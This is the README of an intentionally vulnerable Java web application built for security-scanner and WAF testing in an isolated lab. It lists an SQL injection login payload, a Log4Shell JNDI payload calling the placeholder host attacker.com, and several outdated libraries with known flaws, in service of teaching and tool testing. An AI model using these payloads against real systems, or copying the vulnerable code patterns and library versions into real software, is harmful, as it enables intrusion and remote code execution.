# SAST
SAST


Vulnerable Java Web Application (Lab)
⚠️ Disclaimer
This application is intentionally vulnerable for security testing and learning purposes only.
Do NOT expose this to the internet.
---
📁 Project Structure
```
vulnerable-java-app/
├── pom.xml
├── README.md
├── src/
│   └── main/
│       ├── java/com/vulnapp/LoginServlet.java
│       └── webapp/
│           ├── index.jsp
│           └── WEB-INF/web.xml
```
---
💣 Included Vulnerabilities
1. SQL Injection
Found in `LoginServlet.java`
Example payload:
```
' OR '1'='1
```
2. Log4Shell (Log4j 2.14.1)
Trigger point:
```
logger.error("Login attempt: " + user);
```
Example payload:
```
${jndi:ldap://attacker.com/a}
```
3. Vulnerable Libraries (SCA)
log4j-core 2.14.1
jackson-databind 2.9.8
commons-collections 3.2.1
h2 1.4.200
---
🚀 How to Build
Prerequisites
Java 8+
Maven
Build the project
```
mvn clean package
```
This will generate:
```
target/vulnapp.war
```
---
▶️ How to Deploy
Option 1: Apache Tomcat
Download and install Apache Tomcat
Copy WAR file:
```
cp target/vulnapp.war /path/to/tomcat/webapps/
```
Start Tomcat:
```
./startup.sh   (Linux)
startup.bat    (Windows)
```
Access the app:
```
http://localhost:8080/vulnapp/
```
---
🧪 Testing the Application
Login Page
```
http://localhost:8080/vulnapp/
```
SQL Injection Test
Username:
```
' OR '1'='1
```
Log4Shell Test
Username:
```
${jndi:ldap://attacker.com/a}
```
---
🧠 Recommended Usage
Run with AppScan or any DAST scanner
Use SCA tools (Snyk, Dependabot)
Test WAF rules and detection
---
🛑 Cleanup
Stop Tomcat and remove:
```
webapps/vulnapp*
```
---
📌 Notes
This app is NOT production-safe
Run only in isolated lab (VM / VLAN)
